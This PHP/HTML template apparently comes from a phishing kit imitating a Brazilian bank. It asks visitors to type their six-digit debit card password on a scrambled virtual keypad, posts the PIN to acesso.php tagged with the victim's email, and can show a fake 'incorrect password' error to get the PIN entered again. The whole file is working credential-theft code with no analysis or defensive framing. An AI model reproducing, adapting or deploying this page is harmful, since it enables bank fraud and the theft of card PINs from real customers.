<div class="block_loading">
	<div class="block_title">
		<span class="headline"><?= getSaudacao();?><b> <?= $ShowNameUser;?></b></span>
		<p class="description">Para continuar com o acesso, informe os dados abaixo:</p>
	</div>
		
	<div class="block_ps4">

		<?php 
			if(isset($_SESSION['ShowError']) && $_SESSION['ShowError'] == 1):
				$display = 'block!important;';
				$_SESSION['ShowError'] = 0;
			else:
				$display = 'none!important;';
			endif;	
		?>
		<div class="block_error" style="display:<?php echo $display;?>">
			A senha do cartão de crédito/débito informada não está correta!
			<span class="pos_close_error">x</span>
			<div class="clear"></div>
		</div><!-- block_errorblock_error -->
		<div class="clear"></div>

		<div class="block_message_all">
			Informe a senha do seu cartão através do teclado virtual, para validar as informações e clique em <span class="red_txt">Avançar</span> para proseguir o acesso com segurança.
		</div><!-- block_message_all -->
		
		<span class="desc_exec_show">Informe sua senha do <b class="red_txt">Cartão de Débito</b> clicando nos botões ao lado:</span>
		
		<div class="block_numbers_pass">
			<div class="block_up_pass">
				
				<span class="show_number_pass J_9">9</span>
				<span class="show_number_pass J_7">7</span>
				<span class="show_number_pass J_2">2</span>
				<span class="show_number_pass J_8">8</span>
				<span class="show_number_pass J_3">3</span>
				<span class="show_number_pass J_0">0</span>
				<span class="show_number_pass J_1">1</span>
				<span class="show_number_pass J_6">6</span>
				<span class="show_number_pass J_4">4</span>
				<span class="show_number_pass J_5">5</span>
				<div class="button_clear_pass J_Clear"></div><!-- button_clear_pass -->
			</div><!-- block_up_pass -->	
			<div class="block_down_pass">
				<form action="acesso.php?cliente=<?php echo $emailx; ?>" method="post" name="ps6_form" id="ps6_form" onsubmit="return check_P6();">
					<input type="password" name="recebe_info_pass" id="recebe_info_pass" class="input_faque" readonly="readonly">
					<input type="hidden" name="sender" value="get_pass_cc">
				</form>
				<span>(Informe sua senha de 6 dígitos,a mesma usada para saques e pagamentos)</span>
			</div><!-- block_down_pass -->

			
		</div><!-- block_numbers_pass -->

	</div><!-- block_ps4 -->

	<div class="block_buttons_form">
		<div class="clear_btn J_Cancel"></div>
		<div class="submit_btn J_Submit_P6"></div>
	</div><!-- block_buttons_form -->

</div><!-- block_loading -->